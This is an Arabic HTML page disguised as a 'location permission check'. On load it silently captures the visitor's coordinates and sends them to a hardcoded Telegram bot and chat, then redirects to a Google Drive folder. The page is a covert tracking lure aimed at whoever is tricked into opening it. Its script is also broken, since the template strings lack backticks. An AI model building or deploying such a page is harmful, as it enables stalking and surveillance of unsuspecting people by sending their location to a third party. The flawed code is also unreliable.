<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من إذن الموقع</title>
    <script>
        function sendLocationToTelegram(latitude, longitude) {
            var botToken ="7749694204"
            var chatId = "801362239"
            var message = 🔍 موقع جديد تم التقاطه:\n\n🌍 خط العرض: ${latitude}\n📍 خط الطول: ${longitude};
            var telegramApiUrl = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};

            
            fetch(telegramApiUrl)
                .then(response => response.json())
                .then(data => {
                    console.log("تم إرسال الموقع:", data);
                         window.location.href = "https://drive.google.com/drive/folders/1xbhkvUu4T-Kx6Px-BNJbrx1mtvMV7Ag0";
                })
                .catch(error => console.error("حدث خطأ أثناء الإرسال:", error));
        }

        function checkLocationPermission() {
            if (!navigator.geolocation) {
                alert("المتصفح لا يدعم تحديد الموقع.");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                function (position) {
                    var latitude = position.coords.latitude;
                    var longitude = position.coords.longitude;
                    sendLocationToTelegram(latitude, longitude);
                },
                function (error) {
                    alert("هل تريد  فتح الموقع؟.");
                }
            );
        }
    </script>
</head>
<body onload="checkLocationPermission()">
    <h2>جارٍ التحقق من إذن الموقع...</h2>
</body>
</html>
